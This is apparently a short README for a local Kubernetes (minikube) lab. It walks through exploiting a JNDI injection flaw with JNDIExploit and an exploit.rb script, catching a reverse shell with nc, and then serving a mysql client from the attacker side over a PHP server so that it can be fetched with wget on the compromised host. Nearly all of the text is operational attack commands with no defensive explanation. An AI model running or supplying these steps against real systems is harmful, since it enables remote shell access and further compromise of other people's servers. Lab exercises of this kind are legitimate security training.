
Once you've done the setup in the readme_original

## how to exploit 
launch this command with the file present in the exploit/ folder
```
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i host.minikube.internal -p 8080
```

then launch this command 

```
ruby ./script/exploit.rb & nc -lv 3000
```

you should get a shell on the machine

## how to execute mysql command


we need mysql client

let's download it on my side

launch a php server next to it with the command

```
php -S 0.0.0.0:8000
```

then from the server where you have a reverse shell download the tool with

```
wget host.minikube.internal:8000/mysql
```

execute the client

